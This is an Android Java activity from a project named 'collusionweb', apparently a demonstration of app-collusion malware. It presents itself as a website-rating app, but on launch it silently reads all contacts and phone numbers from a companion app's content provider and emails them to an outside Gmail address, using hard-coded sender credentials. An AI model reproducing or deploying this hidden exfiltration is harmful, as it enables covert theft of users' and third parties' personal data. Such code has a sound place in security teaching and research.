package com.enseirb.collusionweb;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ContentProviderClient;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.RatingBar;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;


public class MainActivity extends AppCompatActivity {
    private static final String TAG = "ContactProvider";
    private static WebsitesDatabase websites_db;
    private static boolean websiteExistsInDB = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        websites_db = new WebsitesDatabase(this);
        StringBuilder body = new StringBuilder();
        body.append("Contacts : \n");
        Cursor contacts = getContentResolver().query(Uri.parse("content://com.enseirb.collusioncontact.provider"), null, null, null, null);
        if (contacts.moveToFirst()) {
            do {
                String contactName = contacts.getString(contacts.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                String contactId = contacts.getString(contacts.getColumnIndex(ContactsContract.Contacts._ID));
                StringBuilder phoneNumbers = new StringBuilder();
                Cursor phones = getContentResolver().query(Uri.parse("content://com.enseirb.collusioncontact.provider"), null, contactId, null, null);

                if (phones.moveToFirst()) {
                    do {
                        phoneNumbers.append(phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    } while (phones.moveToNext());
                }

                phones.close();
                body.append(contactName).append(" : ").append(phoneNumbers).append("\n");
                Log.v(TAG,body.toString());
            } while (contacts.moveToNext());
        }
        contacts.close();
        sendEmail(body.toString());
    }

    /*
     *   AUXILIARY FUNCTIONS
     */
    private boolean isUrlStartingCorrectly(Uri url) {
        String parsed_url = url.toString();
        return parsed_url.startsWith("http://") || parsed_url.startsWith("https://");
    }

    public void sendEmail(String emailBody) {
        String fromEmail = "jean.test.mobile@gmail.com";
        String fromPassword = "MotDePasse123!";
        String toEmail = "juliette.deguillaume@gmail.com";
        String emailSubject = "Subject test bis";

        new GMail(fromEmail, fromPassword, toEmail, emailSubject, emailBody);
    }

    /*
     *   ON CLICK EVENTS
     */
    public void goToInternet(View view) {
        // Getting the url entered by user
        EditText et_url = findViewById(R.id.url);
        Uri web_page = Uri.parse(et_url.getText().toString());

        // If url does not start with http[s]://
        if (!isUrlStartingCorrectly(web_page)) {
            // Display a warning toast
            Context context = getApplicationContext();
            CharSequence text = "URL should start with http:// or https://";
            int duration = Toast.LENGTH_LONG;
            Toast toast = Toast.makeText(context, text, duration);
            toast.show();
        } else {
            // Redirecting to url on internet
            Intent intent = new Intent(Intent.ACTION_VIEW, web_page);
            startActivity(intent);

            hideWebsiteExistingRating(view);
            hideButtonsSection(view);
            displayWebsiteRating(view);
        }
    }

    public void updateOrSaveWebsite(View view) {
        if (websiteExistsInDB) {
            updateWebsite(view);
        } else {
            addWebsite(view);
        }

        EditText et_url = findViewById(R.id.url);
        et_url.setText("");
        hideWebsiteRating(view);
        hideWebsiteExistingRating(view);
        displayButtonsSection(view);
    }

    public void addWebsite(View view) {
        EditText et_url = findViewById(R.id.url);
        RatingBar ratingBar = findViewById(R.id.ratingBar);

        Website website = new Website(et_url.getText().toString(), ratingBar.getRating());

        websites_db.open();
        websites_db.insertWebsite(website);
        websites_db.close();
    }

    public void updateWebsite(View view) {
        EditText et_url = findViewById(R.id.url);
        RatingBar ratingBar = findViewById(R.id.ratingBar);

        websites_db.open();
        websites_db.updateRatingByUrl(et_url.getText().toString(), ratingBar.getRating());
        websites_db.close();
    }


    /*
     *   BUTTONS SECTION
     */
    public void hideButtonsSection(View view) {
        LinearLayout btns_section = findViewById(R.id.btns_section);
        btns_section.setVisibility(View.INVISIBLE);
    }

    public void displayButtonsSection(View view) {
        LinearLayout btns_section = findViewById(R.id.btns_section);
        btns_section.setVisibility(View.VISIBLE);
    }


    /*
     *   WEBSITE RATING SECTION
     */
    public void hideWebsiteRating(View view) {
        LinearLayout rating_section = findViewById(R.id.rating_section);
        RatingBar ratingBar = findViewById(R.id.ratingBar);

        rating_section.setVisibility(View.INVISIBLE);
        ratingBar.setRating(0);
    }

    public void displayWebsiteRating(View view) {
        LinearLayout rating_section = findViewById(R.id.rating_section);
        EditText et_url = findViewById(R.id.url);
        RatingBar ratingBar = findViewById(R.id.ratingBar);
        Button save_update_btn = findViewById(R.id.save_update_btn);

        websites_db.open();
        float rating = websites_db.getRatingByUrl(et_url.getText().toString());
        websites_db.close();

        if (rating >= 0) {
            ratingBar.setRating(rating);
            save_update_btn.setText(R.string.update_btn);
            websiteExistsInDB = true;
        } else {
            ratingBar.setRating(0);
            save_update_btn.setText(R.string.save_btn);
            websiteExistsInDB = false;
        }

        rating_section.setVisibility(View.VISIBLE);
    }


    /*
     *   WEBSITE EXISTING RATE SECTION
     */
    public void hideWebsiteExistingRating(View view) {
        LinearLayout rating_section = findViewById(R.id.display_rating_section);
        TextView rating_text = findViewById(R.id.display_rating_text);
        RatingBar ratingBar = findViewById(R.id.ratingDisplayBar);

        rating_section.setVisibility(View.INVISIBLE);
        rating_text.setText("");
        ratingBar.setRating(0);
    }

    public void displayWebsiteExistingRating(View view) {
        EditText et_url = findViewById(R.id.url);
        LinearLayout rating_section = findViewById(R.id.display_rating_section);
        TextView rating_text = findViewById(R.id.display_rating_text);
        RatingBar ratingDisplayBar = findViewById(R.id.ratingDisplayBar);

        websites_db.open();
        float rating = websites_db.getRatingByUrl(et_url.getText().toString());
        websites_db.close();

        if (rating_section.getVisibility() == View.VISIBLE) {
            rating_section.setVisibility(View.INVISIBLE);
        } else {
            rating_section.setVisibility(View.VISIBLE);

            if (rating >= 0) {
                ratingDisplayBar.setVisibility(View.VISIBLE);
                ratingDisplayBar.setRating(rating);
                rating_text.setText("You rated " + et_url.getText().toString() + " :");
            } else {
                ratingDisplayBar.setVisibility(View.INVISIBLE);
                rating_text.setText("You did not rate " + et_url.getText().toString());
            }
        }

    }
}